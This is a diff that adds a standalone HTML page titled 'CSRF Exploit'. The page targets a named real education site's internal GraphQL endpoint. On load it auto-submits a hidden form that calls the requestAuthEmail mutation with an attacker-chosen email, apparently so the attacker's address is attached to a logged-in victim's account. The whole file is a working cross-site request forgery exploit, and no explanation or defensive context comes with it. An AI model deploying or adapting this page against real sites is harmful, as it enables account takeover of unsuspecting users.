@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Exploit</title>
+</head>
+<body>
+    <h1>Click the button to trigger the CSRF attack!</h1>
+
+    <form id="csrfForm" action="https://www.khanacademy.org/api/internal/graphql/requestAuthEmail?lang=en&_=240807-1626-6591bfdb76a6_1723110650372" method="POST">
+        <input type="hidden" name="operationName" value="requestAuthEmail">
+        <input type="hidden" name="variables" value='{"authEmail":"hackeremail123.com"}'>
+        <input type="hidden" name="query" value='mutation requestAuthEmail($authEmail: String!) { requestAuthEmail(authEmail: $authEmail) { user { id pendingEmails __typename } error { code __typename } __typename } }'>
+        <input type="submit" value="Trigger CSRF Attack">
+    </form>
+
+    <script>
+        document.getElementById('csrfForm').submit(); // Automatically submit the form
+    </script>
+</body>
+</html>
+
